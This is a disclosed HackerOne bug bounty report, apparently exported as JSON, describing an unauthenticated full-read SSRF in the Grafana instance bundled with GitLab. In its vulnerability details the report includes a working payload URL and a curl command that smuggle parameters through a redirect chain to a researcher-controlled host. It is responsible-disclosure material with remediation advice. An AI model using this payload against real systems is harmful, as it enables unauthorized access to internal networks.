{
  "id": 878779,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84Nzg3Nzk=",
  "url": "https://hackerone.com/reports/878779",
  "title": "Full Read SSRF on Gitlab's Internal Grafana",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2020-05-20T13:47:25.959Z",
  "submitted_at": "2020-05-20T13:47:25.959Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "rhynorater",
    "url": "/rhynorater",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/rw91k8k43iydpwtciwnem8j0f0qy/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-08-07T13:48:20.744Z",
  "bug_reporter_agreed_on_going_public_at": "2020-07-20T05:14:45.861Z",
  "team_member_agreed_on_going_public_at": "2020-08-07T13:48:20.649Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Apparently, Grafana is bundled with Gitlab by default. So the grafana instance that is accessible via `/-/grafana/`is vulnerable to the SSRF outlined below.\n\n## Summary\nBy chaining together some redirects and a URL decoding bug, it is possible to achieve a full-read, unauthenticated, SSRF from your Grafana instance. It is possible to recreate this bug on `dev.gitlab.org/-/grafana`. \n\n## Details\nIn the grafana source code, the following route is defined:\n```\n\tr.Get(\"/avatar/:hash\", avatarCacheServer.Handler)\n```\nThis route takes the hash from under `/avatar/:hash` and routes it to `secure.grafana.com` in order to access a user's gravatar image. The code that does this looks like this:\n```\nconst (\n\tgravatarSource = \"https://secure.gravatar.com/avatar/\"\n)\n...\ncase err = <-thunder.GoFetch(gravatarSource+this.hash+\"?\"+this.reqParams, this):\n```\nThe `this.hash` referenced in this code is the hash passed in via `/avatar/:hash` **URL Decoded**. The fact that this `:hash` is URL Decoded allows us to smuggle in our own parameters into this request. On `secure.gravatar.com`, if you supply the `d` parameter, it allows for redirection to `i0.wp.com` where some of the images are hosted. This is the first redirect in the redirect chain.\n\nIn order to get from `i0.wp.com` to any arbitrary host, quite a lot of investigation into this domain had to be performed. In the end, the open redirect achieved due to some improper redirect validation. The format of urls on `i0.wp.com` are as follows `i0.wp.com/{domainOfImage}/{pathOfImage}`. It seems that `i0.wp.com` wanted to offload some of its image hosting to `.bp.blogspot.com` whenever possible, so for any host whose domain was `*.bp.blogspot.com`, `i0.wp.com` would redirect to that host in order to avoid serving the image. However, after many long hours of investigation, it was discovered that it is possible to turn this into an open redirect using the following form:\n```\nhttp://i0.wp.com/google.com/1.bp.blogspot.com/\n```\nBy using this trick it is possible to create a redirection chain that goes like this:\n```\nhttps://secure.gravatar.com/avatar/anything?d=/google.com/1.bp.blogspot.com/\n->\nhttp://i0.wp.com/google.com/1.bp.blogspot.com/\n->\nhttps://google.com/1.bp.blogspot.com\n```\n\nFinally, using this it is possible to create the SSRF using the following payload:\n```\nhttps://dev.gitlab.org/-/grafana/avatar/tesata%3fd%3dredirect.rhynorater.com%252f1.bp.blogspot.com%252fYOURHOSTHERE%26cachebust\n```\n(`redirect.rhynorater.com` is configured to redirect to any host provided after the `1.bp.blogspot.com` directory)\n\n## Steps to Reproduce\nRun the following `curl` command:\n```\ncurl \"https://dev.gitlab.org/-/grafana/avatar/test%3fd%3dredirect.rhynorater.com%252f1.bp.blogspot.com%252fpoc.rhynorater.com%26cachebust\"\n```\n\n## Remediation\nIn order to remediate this bug one must either take the Grafana instance inside the internal network or WAF off the `/avatar/` endpoint.\n\n## Impact\n\nFull read, unauthenticated SSRF. This can result in RCE in many environments due to cloud misconfigurations",
  "weakness": {
    "id": 68,
    "name": "Server-Side Request Forgery (SSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 209,
  "voters": [
    "svalkanov",
    "lowtoe",
    "sky003",
    "caesarsec",
    "cxzer0",
    "muthu_prakash",
    "time4ster",
    "n1m0",
    "g4mb4",
    "xploiterr",
    "and 199 more..."
  ],
  "severity": {
    "rating": "critical",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 39022,
    "asset_type": "OTHER",
    "asset_identifier": "Your Own GitLab Instance",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
